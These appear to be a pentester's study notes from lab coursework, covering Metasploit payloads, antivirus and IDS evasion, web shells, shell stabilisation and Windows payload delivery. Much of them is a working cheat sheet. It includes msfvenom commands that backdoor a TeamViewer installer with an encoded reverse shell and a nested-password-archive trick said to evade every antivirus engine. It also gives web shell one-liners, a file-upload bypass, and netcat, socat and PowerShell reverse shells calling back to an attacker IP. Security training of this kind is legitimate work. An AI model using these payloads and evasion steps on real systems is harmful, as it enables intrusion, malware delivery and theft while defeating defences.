        > Now we can trigger the .aspx payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our multi/handler module, we would have received a connection. We should ensure that our .aspx file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.
        > If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.
    * Local Exploit Suggester
        > As a tip, there is a module called the Local Exploit Suggester. We will be using this module for this example, as the Meterpreter shell landed on the IIS APPPOOL\Web user, which naturally does not have many permissions. Furthermore, running the sysinfo command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.
        > It finishes using other suggested exploit



[+] Firewall and IDS/IPS evasion
Security Policy	                            Description
Signature-based Detection	                The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. 
                                            Any 100% match against these signatures will generate alarms.
Heuristic / Statistical Anomaly Detection	Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). 
                                            The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.
Stateful Protocol Analysis Detection	    Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.
Live-monitoring and Alerting (SOC-based)	A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity 
                                            and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the 
                                            automated mechanisms take action instead.
* Evasion Techniques

    > Most host-based anti-virus software nowadays relies mainly on Signature-based Detection to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.
    > How do we circumvent all this heat? We play along with it. The examples shown in the Encoders section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.
    > However, with the MSF6 release, msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, successfully encrypting the traffic as the payload is sent to the victim host. This mostly takes care of the network-based IDS/IPS. In some rare cases, we might be met with very strict traffic rulesets that flag our connection based on the sender's IP address. The only way to circumvent this is to find the services being let through. An excellent example of this would be the Equifax hack of 2017, where malicious hackers have abused the Apache Struts vulnerability to access a network of critical data servers. DNS exfiltration techniques were used to slowly siphon data out of the network and into the hackers' domain without being noticed for months. To learn more about this attack, visit the links below:
        + US Government Post-Mortem Report on the Equifax Hack
        + Protecting from DNS Exfiltration
        + Stoping Data Exfil and Malware Spread through DNS
    > Returning to msfconsole, its capability to now sustain AES-encrypted tunnels, together with Meterpreter's feature of running in memory, raises our capability by a margin. However, we still have the issue of what happens to a payload once it reaches its destination, before it is run and placed into memory. This file could be fingerprinted for its signature, matched against the database, and blocked, together with our chances of accessing the target. We can also be sure that AV software developers are looking at msfconsole modules and capabilities to add the resulting code and files to their signature database, resulting in most if not all of the default payloads being immediately shut down by AV software nowadays.
    > We are in luck because msfvenom offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use any executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.
        m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

    > For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the -k flag as it appears above. However, even with the -k flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.


    + Archives
        > Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.
            m1l0js@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

        > If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.
            m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test.js 
        > Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names. For this purpose, we can install the RAR(https://www.rarlab.com/download.htm) utility from RARLabs, which works precisely like WinRAR on Windows.
            m1l0js@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
            m1l0js@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
            m1l0js@htb[/htb]$ rar a ~/test.rar -p ~/test.js

            m1l0js@htb[/htb]$ ls
            test.js   test.rar

            m1l0js@htb[/htb]$ mv test.rar test
            m1l0js@htb[/htb]$ ls
            test   test.js

            m1l0js@htb[/htb]$ rar a test2.rar -p test //Archiving the payload again

            m1l0js@htb[/htb]$ mv test2.rar test2
            m1l0js@htb[/htb]$ ls
            test   test2   test.js
        
        > The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.
            m1l0js@htb[/htb]$ msf-virustotal -k <API key> -f test2
            //Success. False in all AV solutions

    + Packers
        > The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.
        > A list of popular packer software:
            UPX packer (https://upx.github.io/)	            
            The Enigma Protector (https://enigmaprotector.com/)	
            MPRESS (https://www.matcode.com/mpress.htm)
            Alternate EXE Packer	
            ExeStealth	            
            Morphine
            MEW	                    
            Themida	
        > If we want to learn more about packers, please check out the PolyPack project ==> (https://jon.oberheide.org/files/woot09-polypack.pdf)
    
    + Exploit Coding
        > When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.
        > For example, a typical Buffer Overflow exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.
        > When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an Offset switch inside the code for the msfconsole module:
            'Targets' =>
            [
             	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
            ],
        > Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.

        > For more information about exploit coding, we recommend checking out the Metasploit - The Penetration Tester's Guide book(https://nostarch.com/metasploit) from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.


-=-=-=-=-=-

* Web Shell
	> Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
	[+] Reliable web shells scripts
		> PHP
			<?php system($_REQUEST["cmd"]); ?>
		> JSP 
			<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
		> ASP
			<% eval request("cmd") %>
	[+] Uploading a Web Shell
	    > Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it here. Let's examine Laudanum(https://github.com/jbarcia/Web-Shells/tree/master/laudanum) and see how it works.
	    * Working with Laudanum
		> The Laudanum files can be found in the /usr/share/webshells/laudanum directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your attacking host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.
		+ Move a copy for modification
		    m1l0js@htb[/htb]$ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
		+ Add your IP address to the allowedIps variable on line 59. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.
		> Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
		> Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the \\files\ directory, and the name was kept the same. This won't always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that's not the case. With this particular web application, our file went to status.inlanefreight.local\\files\demo.aspx and will require us to browse for the upload by using that \ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as status.inlanefreight.local//files/demo.aspx.

        > URLS
            (https://ippsec.rocks/?#)

    > ASPX eplained
      + Active Server Page Extended (ASPX) is a file type/extension written for Microsoft's ASP.NET Framework. On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.
    > Antak Webshell
      + Antak is a web shell built-in ASP.Net included within the Nishang project. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on Antak. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak.
      + Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.
      > Working with Antak
        + The Antak files can be found in the /usr/share/nishang/Antak-WebShell directory.

    [+] Hands-on With a PHP-Based Web Shell.
        > Since PHP processes code & commands on the server-side, we can use pre-written payloads to gain a shell through the browser or initiate a reverse shell session with our attack box. In this case, we will take advantage of the vulnerability in rConfig 3.9.6 to manually upload a PHP web shell and interact with the underlying Linux host. In addition to all the functionality mentioned earlier, rConfig allows admins to add network devices and categorize them by vendor. Go ahead and log in to rConfig with the default credentials (admin:admin), then navigate to Devices > Vendors and click Add Vendor.

        > We will be using WhiteWinterWolf's PHP Web Shell(https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a .php file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo browse button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing Burp Suite.
          sed 's/#.*$//' -e '/^$/d' myshell.php
          sed 's://.*::g' shell.php //To eliminate comments
          sed '/./!d' shell.php //To eliminate blank lines

        > Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. 127.0.0.1 will go in the IP address field, and 8080 will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).

        > Our goal is to change the content-type to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can navigate to that file and have our web shell.
        > Bypassing the File Type Restriction
            + With Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell. Click the browse button, navigate to wherever our .php file is stored on our attack box, and select open and Save (we may need to accept the PortSwigger Certificate). It will seem as if the web page is hanging, but that's just because we need to tell Burp to forward the HTTP requests. Forward requests until you see the POST request containing our file upload. It will look like this:
            + As mentioned in an earlier section, you will notice that some payloads have comments from the author that explain usage, provide kudos and links to personal blogs. This can give us away, so it's not always best to leave the comments in place. We will change Content-type from application/x-php to image/gif. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select Forward twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.
            + The message: 'Added new vendor NetVen to Database` lets us know our file upload was successful. We can also see the NetVen vendor entry with the logo showcasing a ripped piece of paper. This means rConfig did not recognize the file type as an image, so it defaulted to that image. We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server:
                /images/vendor/connect.php
            + This executes the payload and provides us with a non-interactive shell session entirely in the browser, allowing us to execute commands on the underlying OS.
        
        > Considerations when Dealing with Web Shells
            + When utilizing web shells, consider the below potential issues that may arise during your penetration testing process:
                - Web applications sometimes automatically delete files after a pre-defined period
                - Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. whoami && hostname), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
                - Greater chance of leaving behind proof that we were successful in our attack
            + Depending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and cover our tracks. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. In most cases, when attempting to gain a shell session with a target, it would be wise to establish a reverse shell and then delete the executed payload. Also, we must document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use. We could include a sha1sum or MD5 hash of the file name, upload locations in our reports as proof, and provide attribution.
  



		> However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
		> Default webroots for common web servers
			Web Server 	Default Webroot
			Apache 	/var/www/html/
			Nginx 	/usr/local/nginx/html/
			IIS 	c:\inetpub\wwwroot\
			XAMPP 	C:\xampp\htdocs\
		> We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
			echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
		[+] Accessing web shell. Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:
			> By Curl
				curl http://SERVER_IP:PORT/shell.php?cmd=id
			> By Browser
				http://SERVER_IP:PORT/shell.php?cmd=id
		> A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

		> On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

* Upgrading TTY
	[+] Linux
	    > There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.
	    > Know that whenever we see /bin/sh or /bin/bash, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across bourne shell (/bin/sh) and bourne again shell (/bin/bash) present on the system natively.
		/bin/sh -i
		    #This command will execute the shell interpreter specified in the path in interactive mode (-i).
		perl —e 'exec "/bin/sh";'
		perl: exec "/bin/sh";
		    #The command directly above should be run from a script.
		ruby: exec "/bin/sh"
		    #If the programming language Ruby is present on the system, this command will execute the shell interpreter specified:
		    #The command directly above should be run from a script.
		lua: ox.execute('/bin/sh')
		    #If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
		    #The command directly above should be run from a script.
		awk 'BEGIN {system("/bin/sh")}'
		    #AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 
		find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
		find . -exec /bin/sh \; -quit
		vim -c ':!/bin/sh'
		    #Vim to shell
		vim
		:set shell=/bin/sh
		:shell
		    #Vim escape



		script /dev/null -c bash OR whereis python and python -c 'import pty;pty.spawn("/bin/bash")'
  		ctrl + z 
  		stty raw -echo
  		fg  ==> Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
  		reset 
  		xterm 
  		export TERM=xterm or xterm-256color ==> In our machine echo $TERM
  		export SHELL=bash
		stty -a ==> En nuestra terminal 
  		stty rows [x] cols [x]

		!!Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
	    
	> Powershell
		rlwrap nc -lvnp <port>
		stty raw -echo;fg 
* Socat
	We would like to transfer a socat static compiled binary
  	sudo python3 -m http.server 80 
  	On the target machine
  		Linux: wget <LOCAL-IP>/socat -O /tmp/socat
  	  	Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe 
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
		On Kali (listen):
			socat file:`tty`,raw,echo=0 tcp-listen:4444
		On Victim (launch):
			socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

    > Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
      Reverse shells
          socat TCP-L:<port> - #Equivalent to nc -lvnp <port>. 
          Linux: socat TCP:<LOCAL-IP:<LOCAL-PORT> EXEC:"bash -li"
          Windows: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes #Pipes used to force powershell or cmd.exe to use Unix style standard input and output
      
      Bind shells
          socat TCP:<TARGET-IP>:<TARGET-PORT> -
          Linux: socat TCP-L:<PORT> EXEC:"bash -li"
          Windows: socat TCP-L:<PORT> EXEC:powershell.exe,pipes

    > Fully stable Linux TTY reverse shell. Only on Linux.
        socat TCP-L:<port> FILE:`tty`,raw,echo=0
        socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
          pty, allocates a pseudoterminal on the target -- part of the stabilisation process
          stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
          sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
          setsid, creates the process in a new session
          sane, stabilises the terminal, attempting to "normalise" it.
      If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

    > Encrypted shells 
      openssl req --newkey rsa:2048 -nodes -keyout shell.ke -x509 -days 362 -out shell.crt
      We then need to merge the two files into a single .pem file:
        cat shell.key shell.crt > shell.pem
      Reverse shell
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
        socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
      Bind shell
        socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

      verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

      Example: socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
-=-=-=-=-=-=-=-
Common shell payloads

As a listener:
  nc -lvnp <PORT> -e /bin/bash #This would result in a bind shell on the target
As attacker
  nc <LOCAL-IP> <PORT> -e /bin/bash # Reverse shell on the target

Linux to create a listener for a bind shell
  mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

  Send a netcat reverse shell
    mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

In Windows:
  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

[+] Infiltrating Windows 
	> Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.
	> For example, just in the last five years, there have been 3688 reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from HERE => (https://www.cvedetails.com/vendor/26/Microsoft.html)


* Prominent Windows Exploits
	> Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:
	Vulnerability	Description
	MS08-067	MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. 
			This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was 
			using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.
	Eternal Blue	MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry 
			ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. 
			EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.
	PrintNightmare	A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can 
			install a printer, add a driver that runs for you, and grants you system-level access to the host. 
			This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome 
			post on it here. => (https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
	BlueKeep	CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. 
			This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.
	Sigred		CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits 
			on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server 
			which is commonly the primary Domain Controller.
	SeriousSam	CVE 2021-36924 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the 
			issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be 
			accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes 
			exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
	Zerologon	CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon 
			Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via 
			the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses 
			at a computer account password before finding what they need. This can happen in a matter of a few seconds.

* Enumerating Windows & Fingerprinting methods
	> Since we have a set of targets, what are a few ways to determine if the host is likely a Windows Machine? To answer this question, we can look at a few things. The first one being the Time To Live (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output below, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out this link(https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.


* Bats, DLLs, & MSI Files, Oh My!

	> When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.
	[+] Payload Types to Consider

    		+ DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. => (https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)
    		+ Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. => (https://commandwindows.com/batch.htm)
    		+ VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. => (https://www.guru99.com/introduction-to-vbscript.html)
    		+ MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. => (https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions)
    		+ Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process. => (https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1)

	> Now that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.


* Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

	> Below you will find examples of different payload generation methods and ways to transfer our payloads to the victim. We will talk about some of these methods at a high level since our focus is on the payload generation itself and the different ways to acquire a shell on the target.
		[+] Payload Generation
			> We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very hand way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

			Resource				Description
			+ MSFVenom & Metasploit-Framework	MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate 
								hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation 
								actions once on the host. Think of it as a swiss-army knife.
			+ Payloads All The Things		Here, you can find many different resources and cheat sheets for payload generation and general methodology.
			+ Mythic C2 Framework			The Mythic C2 framework is an alternative option to Metasploit as a Command 
								and Control Framework and toolbox for unique payload generation.
			+ Nishang				Nishang is a framework collection of Offensive PowerShell implants and scripts. 
								It includes many utilities that can be useful to any pentester.
			+ Darkarmour				Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
			
			> URLs => https://github.com/rapid7/metasploit-framework
				  https://github.com/swisskyrepo/PayloadsAllTheThings
				  https://github.com/its-a-feature/Mythic
				  https://github.com/samratashok/nishang
				  https://github.com/bats3c/darkarmour

		[+] Payload Transfer and Execution:
			> Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

    			+ Impacket: Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server.
    			+ Payloads All The Things: is a great resource to find quick oneliners to help transfer files across hosts expediently.
    			+ SMB: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
    			+ Remote execution via MSF: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
    			+ Other Protocols: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

			> Now that we know what tools, tactics, and procedures we can use to transfer our payloads, let's check out an example compromise 

* CMD-Prompt and Power[Shell]s for Fun and Profit.
	> CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as Execution Policy and User Account Control (UAC) can inhibit your ability to execute commands and scripts on the host. These considerations affect PowerShell but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:
	> Use CMD when:
    		+ You are on an older host that may not include PowerShell.
    		+ When you only require simple interactions/access to the host.
    		+ When you plan to use simple batch files, net commands, or MS-DOS native tools.
    		+ When you believe that execution policies may affect your ability to run scripts or other actions on the host.
	> Use PowerShell when:
    		+ You are planning to utilize cmdlets or other custom-built scripts.
